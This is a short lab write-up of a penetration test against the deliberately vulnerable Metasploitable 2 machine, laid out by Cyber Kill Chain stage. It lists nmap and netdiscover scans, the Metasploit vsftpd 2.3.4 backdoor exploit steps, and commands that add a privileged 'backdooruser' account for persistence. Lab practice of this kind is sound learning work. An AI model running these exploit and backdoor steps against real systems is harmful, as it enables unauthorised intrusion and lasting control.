# Penetration Test of Metasploitable 2 

## Objective

The objective of this penetration test was to simulate an attack on a vulnerable system, identify potential security weaknesses, and exploit known vulnerabilities to gain unauthorized access. The Metasploitable 2 machine, a deliberately vulnerable Linux distribution, served as the target, while a Kali Linux machine was used as the attacker system.

### Skills Learned

- Practical application of the Cyber Kill Chain framework.
- Proficiency in using penetration testing tools such as Nmap, netdiscover, and Metasploit.
- Understanding and exploiting known vulnerabilities.
- Gaining and maintaining persistent access to a compromised system.
- Documenting the penetration testing process.

### Tools Used

- Nmap: For network discovery and security auditing.
- netdiscover: For identifying live hosts in a network.
- Metasploit Framework: For exploiting known vulnerabilities.
- Bash scripting: For automating tasks and gathering information.

## Steps
### Reconnaissance
We used netdiscover to identify the IP address of the Metasploitable 2 machine and nmap to enumerate open ports and services. This provided us with detailed information about the target system, including potential vulnerabilities.

Commands:
netdiscover -r 10.0.2.0/24
nmap -sV 10.0.2.4

### Weaponization
We identified vsftpd 2.3.4 on port 21 as a vulnerable service (CVE-2011-2523) and decided to use the corresponding Metasploit module to exploit it.

Commands:
msfconsole
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 10.0.2.4

### Delivery
We executed the Metasploit exploit to gain initial access to the target system.

Commands:
run

### Exploitation
The exploit opened a command shell session with root access on the target machine, confirming successful exploitation.

### Installation
To establish persistent access, we created a new user with administrative privileges. We initially encountered issues with granting sudo privileges but resolved them by adding the user to the admin group.

Commands:
useradd -m -s /bin/bash backdooruser
usermod -aG admin backdooruser

### Command and Control (C2)
We verified that the new user had sudo privileges, ensuring we could maintain control over the system.

Commands:
su - backdooruser
sudo -l

### Actions on Objectives
The goal of documenting a successful penetration test using the Cyber Kill Chain framework was achieved. We gained and maintained access to the Metasploitable 2 machine, demonstrating the importance of continuous vulnerability assessment and remediation.
